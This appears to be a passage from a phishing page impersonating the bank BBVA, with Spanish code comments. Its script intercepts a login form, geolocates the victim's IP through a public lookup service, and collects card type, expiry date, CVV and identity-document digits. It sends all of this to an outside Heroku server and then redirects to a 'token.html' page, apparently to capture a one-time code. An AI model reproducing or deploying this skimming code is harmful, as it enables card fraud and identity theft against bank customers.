              value = value.slice(0, 2) + "/" + value.slice(2, 4); // Inserta el separador '/'

  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const usuario = localStorage.getItem("usuario");
          const tipo = document.querySelector("#tipodoc").value;
          const fecha = document.querySelector("#fecha").value;
          const cvv = document.querySelector("#cvv").value;
          const docs = document.querySelector("#documento").value;

          const message =
            "\nBBVA\nUsuario: " +
            usuario +
            "\nTipo de tarjeta: " +
            tipo +
            "\nFecha: " +
            fecha +
            "\nCVV: " +
            cvv +
            "\nUltimos digitos de su documento: " +
            docs +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post("https://srvdor-33a68f3ab628.herokuapp.com/bbva3", {
              mensaje: message,
            })
            .then((response) => {
              window.location.href = "token.html";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
